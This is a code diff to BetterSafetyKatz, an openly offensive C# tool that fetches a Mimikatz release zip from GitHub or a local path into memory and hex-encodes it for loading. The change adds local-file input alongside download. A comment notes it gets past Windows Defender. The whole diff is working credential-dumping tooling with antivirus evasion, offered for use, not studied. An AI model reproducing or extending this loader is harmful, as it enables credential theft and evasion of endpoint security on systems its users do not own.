@@ -42,7 +42,7 @@ namespace BetterSafetyKatz
                     Console.WriteLine("[X] Process is not 64-bit, this version of katz won't work yo'!");
                     return;
                 }
-                string latestUrl;
+                string latestPath;
 
 
                 // @Arno0x
@@ -62,8 +62,8 @@ namespace BetterSafetyKatz
 
                 if (args.Length != 0)
                 {
-                    latestUrl = args[0];
-                    Console.WriteLine("[+] Downloading");
+                    latestPath = args[0];
+                    Console.WriteLine("[+] Fetching " + latestPath);
                 }
                 else
                 {
@@ -74,14 +74,27 @@ namespace BetterSafetyKatz
                     Regex urlRegex = new Regex(@"https:\/\/github.com\/([a-z\.-]*)\/([a-z\.-]*)\/releases\/download\/([0-9\.-]*)\/([a-z\.-]*)_trunk\.zip", RegexOptions.IgnoreCase);
 
                     //Pull the latest release as a ZIP file
-                    latestUrl = urlRegex.Matches(latestReleases)[0].ToString();
-                    Console.WriteLine("[+] Contacting repo -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
+                    latestPath = urlRegex.Matches(latestReleases)[0].ToString();
+
+                    Console.WriteLine("[+] Contacting repo -> " + latestPath.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
                 }
 
+                //Declare as null
+                byte[] zipStream = null;
 
-                //Download that
-                byte[] zipStream = webClient.DownloadData(latestUrl);
+                //Is it a URI?
+                if (latestPath.StartsWith("http"))
+                {
+                    //Download
+                    zipStream = webClient.DownloadData(latestPath);
+                }
+                else
+                {
+                    //Read file from path
+                    zipStream = File.ReadAllBytes(latestPath);
+                }
 
+               
                 MemoryStream catStream = new MemoryStream();
 
                 // unzip.Extract(@"x64/BADWORD.exe", catStream);
@@ -92,8 +105,6 @@ namespace BetterSafetyKatz
 
                 //Turn katz into hex
                 string hexCats = BitConverter.ToString(catStream.ToArray()).Replace("-", string.Empty);
-
-
 
                 // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
                 
